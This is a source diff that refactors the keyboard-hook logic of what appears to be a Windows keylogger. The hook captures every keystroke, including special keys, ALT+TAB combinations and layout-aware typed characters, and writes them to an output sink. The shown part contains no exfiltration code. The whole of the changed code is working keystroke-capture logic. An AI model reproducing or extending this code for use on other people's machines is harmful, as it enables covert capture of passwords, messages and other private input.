@@ -20,6 +20,37 @@ UserInputEventSource *UserInputEventSource::getInstance()
     return instance;
 }
 
+bool HandleSpecialKey(int vkCode, EventSink *outputSink)
+{
+    switch (vkCode)
+    {
+    case VK_RETURN:
+        *outputSink << "[ENTER]";
+        break;
+    case VK_BACK:
+        *outputSink << "[BACKSPACE]";
+        break;
+    case VK_LCONTROL:
+        *outputSink << "[LCTRL]";
+        break;
+    case VK_LSHIFT:
+        *outputSink << "[LSHIFT]";
+        break;
+    case VK_RSHIFT:
+        *outputSink << "[RSHIFT]";
+        break;
+    case VK_SPACE:
+        *outputSink << "[SPACE]";
+        break;
+    case VK_CAPITAL:
+        *outputSink << "[CAPSLOCK]";
+        break;
+    default:
+        return false;
+    }
+    return true;
+}
+
 LRESULT CALLBACK UserInputEventSource::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
     if (nCode == HC_ACTION)
@@ -37,9 +68,7 @@ LRESULT CALLBACK UserInputEventSource::KeyboardProc(int nCode, WPARAM wParam, LP
             }
             else if (pKeyboard->vkCode == VK_TAB)
             {
-                // If we press tab and alt isnt pressed, then
-                // that means TAB+ALT was entered, not ALT+TAB, so we should
-                // just log out tab by itself and leave it as false
+                // If we press tab and alt isnt pressed, then TAB+ALT was entered, not ALT+TAB, so we should just log out tab by itself and leave it as false
                 if (!leftAltPressed)
                 {
                     *outputSink << "[TAB]";
@@ -50,32 +79,14 @@ LRESULT CALLBACK UserInputEventSource::KeyboardProc(int nCode, WPARAM wParam, LP
                     tabPressed = true;
                 }
             }
-            else if (pKeyboard->vkCode == VK_RETURN)
-            {
-                *outputSink << "[ENTER]";
-            }
-            else if (pKeyboard->vkCode == VK_BACK)
-            {
-                *outputSink << "[BACKSPACE]";
-            }
-            else if (pKeyboard->vkCode == VK_LCONTROL)
-            {
-                *outputSink << "[LCTRL]";
-            }
-            else if (pKeyboard->vkCode == VK_LSHIFT)
-            {
-                *outputSink << "[LSHIFT]";
-            }
-            else if (pKeyboard->vkCode == VK_RSHIFT)
-            {
-                *outputSink << "[RSHIFT]";
-            }
 
+            // Handle ALT+TAB
             if (leftAltPressed && tabPressed)
             {
                 *outputSink << "[ALT+TAB]";
             }
-            else
+            // Handle special key or everything else
+            else if (!HandleSpecialKey(pKeyboard->vkCode, outputSink))
             {
                 // If we get here and alt is pressed, that means that left alt was/is pressed, and the key
                 // that followed it was not TAB, so we'll just treat it as another combination (this is scuffed)
@@ -99,11 +110,19 @@ LRESULT CALLBACK UserInputEventSource::KeyboardProc(int nCode, WPARAM wParam, LP
                     keyboardState[VK_CAPITAL] |= 0x01;
                 }
 
-                // Convert the input to unicode character (need to do this since the input can change based on kbd state
-                // and the keyboard layout)
-                if (ToUnicode(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, unicodeBuffer, 2, 0) == 1)
+                // Check if the key is a "typable" character
+                if ((pKeyboard->vkCode >= 0x30 && pKeyboard->vkCode <= 0x39) || // Numbers
+                    (pKeyboard->vkCode >= 0x41 && pKeyboard->vkCode <= 0x5A) || // Letters
+                    (pKeyboard->vkCode >= VK_OEM_1 && pKeyboard->vkCode <= VK_OEM_3) ||
+                    (pKeyboard->vkCode >= VK_OEM_4 && pKeyboard->vkCode <= VK_OEM_7))
                 {
-                    *outputSink << unicodeBuffer;
+
+                    // Convert the input to unicode character (need to do this since the input can change based on kbd state
+                    // and the keyboard layout)
+                    if (ToUnicode(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, unicodeBuffer, 2, 0) == 1)
+                    {
+                        *outputSink << unicodeBuffer;
+                    }
                 }
             }
         }
